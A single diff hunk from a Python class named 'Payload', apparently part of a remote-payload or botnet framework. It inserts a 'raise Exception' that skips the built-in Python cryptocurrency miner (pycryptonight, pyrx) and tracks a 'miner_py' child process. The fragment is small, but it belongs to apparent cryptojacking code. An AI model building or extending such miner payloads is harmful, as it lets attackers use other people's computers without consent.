@@ -612,6 +612,7 @@ class Payload():
 
             # first attempt using built-in python miner
             try:
+                raise Exception
                 import pycryptonight, pyrx
                 if 'miner_py' in self.child_procs:
                     try:
